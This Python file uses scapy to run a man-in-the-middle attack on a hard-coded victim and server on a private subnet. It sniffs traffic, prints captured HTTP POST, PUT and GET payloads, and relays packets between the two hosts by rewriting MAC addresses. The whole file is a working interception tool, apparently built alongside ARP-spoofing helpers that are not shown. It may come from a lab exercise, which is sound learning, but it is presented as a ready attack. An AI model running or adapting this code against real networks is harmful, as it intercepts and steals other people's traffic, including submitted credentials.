from scapy.all import *
from router_ip_mac import get_router_ip, get_mac
from scapy.layers import http
import copy

def setup():
    global victim_ip, victim_mac, server_ip, server_mac, my_mac
    victim_ip = "192.168.2.100"
    victim_mac = get_mac(victim_ip)
    server_ip = "192.168.2.102"
    server_mac = get_mac(server_ip)
    my_mac = open(f"/sys/class/net/eth0/address").read().strip()


def http_packet(packet):
    raw_data = packet[Raw].load
    if b"POST" in raw_data:
        print("\n\nCaptured POST data: ", raw_data, "\n\n")
    elif b"PUT" in raw_data:
        print("\nCaptured PUT data:, ", raw_data)
    elif b"GET" in raw_data:
        print("\nCaptured GET data: ", raw_data)

def forward_packet(packet):
    if packet.haslayer(Ether) and packet.haslayer(IP):
        packet2 = copy.deepcopy(packet)
        if packet.haslayer(Raw):
            http_packet(packet)
        if packet[Ether].src == victim_mac and packet[IP].dst == server_ip and packet[Ether].dst == my_mac:
            packet2[Ether].dst = server_mac
            sendp(packet2)
        elif packet[Ether].src == server_mac and packet[IP].dst == victim_ip and packet[Ether].dst == my_mac:
            packet2[Ether].dst = victim_mac
            sendp(packet2)



def MITM_attack():
    try:
        print("Starting MITM attack. . .")
        sniff(iface="wlan0", prn=forward_packet, store=0)
    except KeyboardInterrupt:
        print("\nMITM attack terminated")
    return None
